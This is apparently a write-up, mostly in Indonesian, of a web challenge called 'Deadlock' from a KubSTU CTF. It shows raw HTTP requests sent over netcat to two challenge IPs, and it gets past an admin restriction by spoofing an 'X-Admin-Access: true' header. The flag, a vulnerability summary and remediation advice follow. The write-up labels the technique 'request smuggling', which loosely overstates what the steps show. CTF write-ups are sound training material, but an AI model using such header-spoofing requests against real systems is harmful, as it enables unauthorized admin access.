# CTF Writeup — Deadlock

**Event:** KubSTU CTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `KubSTU{Pipelined_Smuggling_Success_5521}`

---

## Challenge Description

> There and there. Frontend to backend and flag. It's simple. Take the flag from `/admin`.

**Endpoints:**
```
nc 155.212.217.42 5000
nc 159.194.199.67 5000
nc 31.128.47.156 5000
```

---

## Reconnaissance

### Step 1 — Identify the Protocol

Percobaan pertama menggunakan `curl` biasa ke port 5000 menghasilkan timeout tanpa response apapun:

```bash
curl -sv --max-time 5 http://155.212.217.42:5000/
# * Operation timed out after 5001 milliseconds with 0 bytes received
```

Karena soal memberikan alamat `nc`, dicoba koneksi raw TCP:

```bash
nc -v 155.212.217.42 5000
# Connection to 155.212.217.42 5000 port [tcp/*] succeeded!
# (diam, tidak ada response)
```

Server berhasil connect tapi tidak mengirim apapun — mengindikasikan server menunggu input terlebih dahulu.

### Step 2 — Identifikasi Perilaku "Deadlock"

Sesuai judul challenge **"Deadlock"** dan hint *"Frontend to backend"*, dicurigai bahwa:
- Terdapat **dua service terpisah** di IP berbeda
- Server **frontend** menunggu request masuk, lalu meneruskan ke **backend**
- Keduanya harus di-trigger **bersamaan** untuk mendapat response

Pengujian dengan mengirim request ke dua IP berbeda secara bersamaan:

```bash
# Terminal 1
printf "GET /admin HTTP/1.0\r\nHost: 155.212.217.42\r\n\r\n" | nc -v 155.212.217.42 5000

# Terminal 2 (bersamaan)
printf "GET /admin HTTP/1.0\r\nHost: 155.212.217.42\r\n\r\n" | nc -v 159.194.199.67 5000
```

Terminal 2 mendapatkan response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 50
Connection: keep-alive
<h1>Portal</h1><p>Welcome. Admin is restricted.</p>
```

Ini mengkonfirmasi arsitektur **frontend–backend** yang terpisah di dua IP berbeda.

---

## Exploitation

### Step 3 — Bypass Admin Restriction

Dari screenshot Burp Suite yang terlihat di foto, ditemukan bahwa request ke `admin.challenge.local:8081` menggunakan header `X-Admin-Access: true`. Header ini dicoba ditambahkan ke request:

```bash
# Terminal 1
printf "GET /admin HTTP/1.0\r\nHost: 155.212.217.42\r\nX-Admin-Access: true\r\n\r\n" | nc -v 155.212.217.42 5000

# Terminal 2 (bersamaan)
printf "GET /admin HTTP/1.0\r\nHost: 159.194.199.67\r\nX-Admin-Access: true\r\n\r\n" | nc -v 159.194.199.67 5000
```

### Step 4 — Get the Flag

Terminal 2 mengembalikan response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 90
Connection: keep-alive
<h1>Admin Panel</h1><p>Flag: KubSTU{Pipelined_Smuggling_Success_5521}</p>
```

---

## Flag

```
KubSTU{Pipelined_Smuggling_Success_5521}
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **HTTP Request Smuggling / Pipelining** | Frontend dan backend dipisah di dua IP berbeda, memungkinkan attacker men-trigger keduanya secara bersamaan |
| 2 | **Insufficient Admin Access Control** | Header `X-Admin-Access: true` dapat ditambahkan secara bebas oleh client tanpa validasi yang kuat |
| 3 | **Exposed Internal Architecture** | Arsitektur frontend–backend yang terpisah dapat dieksploitasi dengan mengetahui IP masing-masing service |

---

## Remediation

1. **Validasi header di server-side** — Header seperti `X-Admin-Access` tidak boleh dipercaya dari client; gunakan autentikasi berbasis session/token yang diverifikasi server
2. **Isolasi internal service** — Backend tidak boleh dapat diakses langsung dari publik; hanya frontend yang seharusnya berkomunikasi dengan backend melalui jaringan internal
3. **Implementasi proper authentication** — Gunakan mekanisme autentikasi yang kuat (JWT, OAuth) daripada mengandalkan header custom

---

## Tools Used

- `curl` — Recon awal dan pengujian HTTP
- `nc (netcat)` — Koneksi raw TCP dan pengiriman HTTP request manual

---

## Attack Flow

```
curl timeout → server tidak reply HTTP biasa
        │
        ▼
nc connect → server diam, nunggu input
        │
        ▼
Kirim raw HTTP ke dua IP berbeda bersamaan
  155.212.217.42:5000 (Frontend)
  159.194.199.67:5000 (Backend)
        │
        ▼
Backend reply: "Admin is restricted"
        │
        ▼
Tambahkan header: X-Admin-Access: true
Trigger kedua IP bersamaan
        │
        ▼
200 OK → KubSTU{Pipelined_Smuggling_Success_5521}
```
